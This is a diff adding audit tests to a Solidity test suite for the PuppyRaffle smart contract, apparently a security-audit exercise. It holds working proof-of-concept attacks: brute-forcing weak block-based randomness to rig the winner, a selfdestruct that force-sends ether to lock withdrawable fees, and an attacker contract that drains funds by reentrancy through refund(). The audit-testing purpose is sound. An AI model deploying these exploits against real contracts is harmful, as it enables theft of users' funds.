@@ -261,6 +261,63 @@ contract PuppyRaffleTest is Test {
         assertGt(initBalance, entranceFee);
         assertEq(endingBalance, 0);
     }
+    function testAuditWeakRNG() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        uint256 myIndex = puppyRaffle.getActivePlayerIndex(playerTwo);
+        uint256 potentialRNG;
+        while (myIndex != potentialRNG) {
+            potentialRNG =
+                uint256(
+                    keccak256(
+                        abi.encodePacked(
+                            playerTwo,
+                            block.timestamp,
+                            block.difficulty
+                        )
+                    )
+                ) %
+                4;
+            vm.warp(block.timestamp + 1);
+            vm.roll(block.number + 1);
+        }
+
+        vm.prank(playerTwo);
+        puppyRaffle.selectWinner();
+        address winner = puppyRaffle.previousWinner();
+        assertEq(winner, playerTwo);
+    }
+    function testAuditRevertAttack() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+
+        vm.prank(playerTwo);
+        puppyRaffle.selectWinner();
+        address winner = puppyRaffle.previousWinner();
+        if (winner != playerTwo) {
+            vm.expectRevert();
+            revert();
+        }
+
+        assertEq(winner, playerTwo);
+    }
+
+    function testAuditLockFees() public playersEntered {
+        vm.warp(block.timestamp + duration + 1);
+        vm.roll(block.number + 1);
+        puppyRaffle.selectWinner();
+        uint256 totalFees = puppyRaffle.totalFees();
+        assertGt(totalFees, 0);
+
+        AtackerContract atacker = new AtackerContract(puppyRaffle);
+        vm.deal(address(atacker), 1e18);
+        atacker.forceSendEther();
+
+        vm.expectRevert();
+        puppyRaffle.withdrawFees();
+        assertEq(totalFees + 1e18, address(puppyRaffle).balance);
+    }
 }
 
 contract AtackerContract {
@@ -270,10 +327,27 @@ contract AtackerContract {
         puppyRaffle = _puppyRaffle;
     }
 
-    fallback() external payable {
+    function forceSendEther() external {
+        selfdestruct(payable(address(puppyRaffle)));
+    }
+
+    function onlyWin() external {
+        puppyRaffle.selectWinner();
+        require(puppyRaffle.previousWinner() == address(this), "Not Winner");
+    }
+
+    function _drainFunds() internal {
         uint256 index = puppyRaffle.getActivePlayerIndex(address(this));
         if (address(puppyRaffle).balance > 0) {
             puppyRaffle.refund(index);
         }
+    }
+
+    fallback() external payable {
+        _drainFunds();
+    }
+
+    receive() external payable {
+        _drainFunds();
     }
 }
